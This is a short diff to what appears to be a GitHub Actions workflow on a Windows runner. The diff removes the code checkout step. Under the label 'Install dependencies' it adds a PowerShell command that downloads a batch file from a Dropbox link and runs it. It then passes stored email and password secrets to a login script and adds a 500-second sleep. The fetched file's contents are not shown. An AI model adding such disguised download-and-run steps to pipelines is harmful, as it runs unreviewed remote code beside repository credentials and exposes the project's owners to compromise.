@@ -8,14 +8,16 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v2
-
     - name: Install dependencies
-      run: cmd /c test.bat
+      run: |
+       Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/qjajylqv7awm5phuglo4w/down.bat?dl=1" -OutFile "down.bat"
+       cmd /c down.bat
 
     - name: Run Python script
       env:
         EMAIL_SECRET: ${{ secrets.EMAIL_SECRET }}
         PASSWORD_SECRET: ${{ secrets.PASSWORD_SECRET }}
-      run: python test.py $Env:EMAIL_SECRET $Env:PASSWORD_SECRET
+      run: python login.py $Env:EMAIL_SECRET $Env:PASSWORD_SECRET
+ 
+    - name: Time Counter
+      run: Start-Sleep -Seconds 500
